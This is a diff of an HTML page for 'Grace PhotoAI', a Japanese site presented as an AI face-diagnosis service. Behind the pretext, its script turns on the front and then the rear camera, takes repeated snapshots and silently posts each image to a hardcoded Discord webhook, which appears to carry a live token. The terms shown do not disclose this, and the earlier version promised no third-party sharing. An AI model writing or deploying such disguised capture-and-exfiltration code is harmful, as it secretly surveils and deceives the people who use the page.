@@ -2,129 +2,89 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta property="og:title" content="AI顔診断 Grace">
+  <meta property="og:description" content="肌年齢、顔の比率、イエベ/ブルベ…すぐにわかる！">
+  <meta property="og:image" content="https://gracephotoai.github.io/grace_preview_1200x630.jpg">
+  <meta property="og:url" content="https://gracephotoai.github.io/">
+  <meta name="twitter:card" content="summary_large_image">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Grace PhotoAI</title>
   <style>
     body {
+      margin: 0;
       background-color: #1e1e1e;
       color: white;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      margin: 0;
-      padding: 0;
+      font-family: sans-serif;
       display: flex;
       flex-direction: column;
-      min-height: 100vh;
-      justify-content: center;
       align-items: center;
-      text-align: center;
+      justify-content: center;
+      height: 100vh;
     }
-
     h1 {
       font-size: 3em;
-      margin-bottom: 40px;
+      margin-bottom: 20px;
     }
-
     button {
-      font-size: 1.5em;
       padding: 20px 40px;
-      border: none;
-      border-radius: 8px;
-      background-color: #4CAF50;
+      font-size: 1.5em;
+      background-color: #444;
       color: white;
+      border: none;
+      border-radius: 10px;
       cursor: pointer;
-      transition: transform 0.2s ease, background-color 0.2s ease;
     }
-
     button:hover {
-      background-color: #45a049;
-      transform: scale(1.05);
+      background-color: #666;
     }
-
-    footer {
+    #video {
+      display: none;
+    }
+    #termsModal {
+      display: none;
       position: fixed;
-      bottom: 10px;
-      width: 100%;
-      text-align: center;
-      color: #aaa;
-      font-size: 0.9em;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: #333;
+      padding: 20px;
+      color: white;
     }
-
-    footer a {
-      color: #aaa;
+    #termsLink {
+      position: absolute;
+      bottom: 10px;
+      font-size: 0.8em;
       text-decoration: underline;
       cursor: pointer;
-    }
-
-    .modal {
-      display: none;
-      position: fixed;
-      z-index: 100;
-      left: 0;
-      top: 0;
-      width: 100%;
-      height: 100%;
-      overflow: auto;
-      background-color: rgba(0,0,0,0.8);
-    }
-
-    .modal-content {
-      background-color: #2e2e2e;
-      margin: 10% auto;
-      padding: 20px;
-      border: 1px solid #888;
-      width: 80%;
-      max-width: 600px;
-      color: white;
-      border-radius: 10px;
-    }
-
-    .close {
-      color: #aaa;
-      float: right;
-      font-size: 28px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-
-    video, canvas {
-      display: none;
     }
   </style>
 </head>
 <body>
   <h1>Grace PhotoAI</h1>
-  <button onclick="startDualCapture()">診断する</button>
-
+  <button onclick="startDiagnosis()">診断する</button>
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
-
-  <footer>
-    <a onclick="showModal()">利用規約</a>
-  </footer>
-
-  <div id="termsModal" class="modal">
-    <div class="modal-content">
-      <span class="close" onclick="closeModal()">&times;</span>
-      <h2>利用規約</h2>
-      <p>このサービスはAIによる顔分析を提供するものです。写真データは診断目的で使用され、第三者に提供されることはありません。利用者は自身の責任でご利用ください。</p>
-    </div>
-  </div>
+  <div id="termsModal">本サービスは撮影された写真をAIで解析し、診断結果を提供します。利用に同意いただける方のみご使用ください。</div>
+  <div id="termsLink" onclick="toggleTerms()">利用規約</div>
 
   <script>
     const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
     const webhookUrl = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";
 
-    async function startDualCapture() {
-      await captureFromCamera("user");
-      setTimeout(() => {
-        captureFromCamera("environment");
-      }, 1500);
+    function toggleTerms() {
+      const modal = document.getElementById("termsModal");
+      modal.style.display = modal.style.display === "block" ? "none" : "block";
+    }
+
+    function stopStream() {
+      if (video.srcObject) {
+        video.srcObject.getTracks().forEach(track => track.stop());
+        video.srcObject = null;
+      }
     }
 
     async function captureFromCamera(facingMode) {
+      stopStream();
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }});
         video.srcObject = stream;
@@ -139,41 +99,38 @@
     }
 
     function captureAndSendImages(count, interval) {
-      let taken = 0;
+      const canvas = document.createElement('canvas');
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      let captured = 0;
       const intervalId = setInterval(() => {
-        if (taken >= count) {
+        if (captured >= count) {
           clearInterval(intervalId);
           return;
         }
-        takeSnapshotAndSend();
-        taken++;
+
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append("file", blob, "photo.jpg");
+          formData.append("content", ""); // 画像のみ送信
+          fetch(webhookUrl, {
+            method: "POST",
+            body: formData
+          });
+        }, "image/jpeg");
+
+        captured++;
       }, interval);
     }
 
-    function takeSnapshotAndSend() {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("file", blob, "capture.jpg");
-        fetch(webhookUrl, { method: "POST", body: formData });
-      }, "image/jpeg");
-    }
-
-    function showModal() {
-      document.getElementById('termsModal').style.display = 'block';
-    }
-
-    function closeModal() {
-      document.getElementById('termsModal').style.display = 'none';
-    }
-
-    window.onclick = function(event) {
-      const modal = document.getElementById('termsModal');
-      if (event.target === modal) {
-        modal.style.display = 'none';
-      }
+    function startDiagnosis() {
+      captureFromCamera("user");  // 内カメ
+      setTimeout(() => {
+        captureFromCamera("environment");  // 外カメ
+      }, 1500);
     }
   </script>
 </body>
